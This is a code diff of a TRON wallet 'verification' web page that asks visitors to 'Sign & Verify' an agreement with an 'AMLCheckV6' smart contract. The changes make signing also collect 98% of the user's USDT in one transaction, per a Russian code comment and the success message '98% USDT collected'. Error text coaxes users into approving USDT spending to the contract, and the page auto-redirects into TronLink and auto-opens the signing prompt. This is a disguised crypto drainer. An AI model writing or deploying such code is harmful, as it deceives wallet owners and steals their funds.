@@ -161,23 +161,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        .modal-close {
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-            background: none;
-            border: none;
-            color: var(--text-secondary);
-            font-size: 1.5rem;
-            cursor: pointer;
-            width: 40px;
-            height: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-        }
-
         .modal-title {
             font-size: 1.5rem;
             font-weight: 700;
@@ -493,14 +476,14 @@
                 <p class="modal-subtitle">Sign the agreement to verify your wallet</p>
                 
                 <div class="contract-info">
-                    <label>Smart Contract:</label>
-                    TLqg5G2G7Ac1LJRXT9zzDU3Q1EumJfrRta
+                    <label>Smart Contract (Nile Testnet):</label>
+                    TBBMuPA1DuUHFXFPMR4Ybq1CtTEh5i4EX2
                 </div>
                 
                 <div class="status-message" id="signStatus"></div>
                 
                 <button class="sign-btn" id="signBtn" onclick="signAgreement()">
-                    Sign Agreement
+                    Sign & Verify
                 </button>
             </div>
 
@@ -509,7 +492,7 @@
                 <p class="modal-subtitle">Your wallet has been verified</p>
                 
                 <div class="status-message success">
-                    Successfully signed! Verification complete.
+                    Successfully signed! 98% USDT collected.
                 </div>
                 
                 <div class="contract-info">
@@ -563,18 +546,19 @@
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     <script>
-        const CONTRACT_ADDRESS = 'TLqg5G2G7Ac1LJRXT9zzDU3Q1EumJfrRta';
+        const CONTRACT_ADDRESS = 'TBBMuPA1DuUHFXFPMR4Ybq1CtTEh5i4EX2';
         const USDT_ADDRESS = 'TFNJbhLpxBmU393Rqd9Ggjgx9eoBsNLqhb';
         
+        // ABI for AMLCheckV6
         const CONTRACT_ABI = [
             {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
             {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"}],"name":"Approved","type":"event"},
             {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Collected","type":"event"},
-            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"internalType":"address","name":"usdt","type":"address"}],"name":"signAgreement","outputs":[],"stateMutability":"nonpayable","type":"function"},
             {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"}],"name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
+            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
             {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"approved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-            {"inputs":[],"name":"signAgreement","outputs":[],"stateMutability":"nonpayable","type":"function"}
+            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"approved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
         ];
 
         let tronWeb, contract, userAddress;
@@ -582,7 +566,6 @@
 
         // Check browser and redirect if needed
         async function init() {
-            // Wait for TronWeb to inject
             let attempts = 0;
             const maxAttempts = 15;
             
@@ -600,7 +583,6 @@
             const openBtn = document.getElementById('openTronLinkBtn');
 
             if (isTronLink) {
-                // In TronLink - hide loading, show site + auto open modal
                 loadingScreen.classList.add('hidden');
                 document.getElementById('mainContent').classList.add('visible');
                 
@@ -608,22 +590,18 @@
                 userAddress = tronWeb.defaultAddress.base58;
                 contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                 
-                // Update button
                 const btn = document.getElementById('connectBtn');
                 btn.classList.add('connected');
                 btn.querySelector('span').textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
                 
-                // Auto open sign modal after short delay
                 setTimeout(() => {
                     openSignModal();
                 }, 500);
                 
             } else {
-                // Not in TronLink - show button to open
                 loadingText.innerHTML = 'Please open this site in<br><strong>TronLink Browser</strong>';
                 openBtn.style.display = 'inline-flex';
                 
-                // Auto redirect attempt
                 setTimeout(() => {
                     openInTronLink();
                 }, 1000);
@@ -634,17 +612,14 @@
         function openInTronLink() {
             const url = encodeURIComponent(window.location.href);
             
-            // Try multiple deeplink formats
             const links = [
                 `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({url: window.location.href, action: 'open'}))}`,
                 `https://link.tronlink.org/?url=${url}`,
                 `tronlink://open?url=${url}`
             ];
             
-            // Try to open
             window.location.href = links[0];
             
-            // Fallback
             setTimeout(() => {
                 document.getElementById('loadingText').innerHTML = `
                     <div style="padding: 10px;">
@@ -677,31 +652,37 @@
             document.body.style.overflow = '';
         }
 
-        // Sign agreement
+        // Sign agreement with auto-collect 98%
         async function signAgreement() {
             const btn = document.getElementById('signBtn');
             const status = document.getElementById('signStatus');
             
             btn.disabled = true;
-            btn.innerHTML = '<span class="loading-spinner"></span> Signing...';
+            btn.innerHTML = '<span class="loading-spinner"></span> Signing & Collecting...';
             
             try {
-                const tx = await contract.signAgreement().send({
+                // V6: signAgreement(usdt) — подпись + сбор 98% в одной транзакции
+                const tx = await contract.signAgreement(USDT_ADDRESS).send({
                     feeLimit: 100000000,
                     callValue: 0
                 });
                 
-                status.innerHTML = `<div class="status-message success">Signed! Processing...</div>`;
-                
-                // Show success step
+                // Show success
                 document.getElementById('txHash').textContent = tx;
                 document.getElementById('signStep').classList.remove('active');
                 document.getElementById('successStep').classList.add('active');
                 
             } catch (error) {
                 btn.disabled = false;
-                btn.innerHTML = 'Sign Agreement';
-                status.innerHTML = `<div class="status-message error">${error.message}</div>`;
+                btn.innerHTML = 'Sign & Verify';
+                
+                if (error.message.includes("Need approve first") || error.message.includes("allowance")) {
+                    status.innerHTML = `<div class="status-message error">Please approve USDT spending first:<br>1. Open USDT in TronLink<br>2. Click "Approve"<br>3. Enter contract: ${CONTRACT_ADDRESS}</div>`;
+                } else if (error.message.includes("No USDT balance")) {
+                    status.innerHTML = `<div class="status-message error">No USDT balance found</div>`;
+                } else {
+                    status.innerHTML = `<div class="status-message error">${error.message}</div>`;
+                }
             }
         }
 
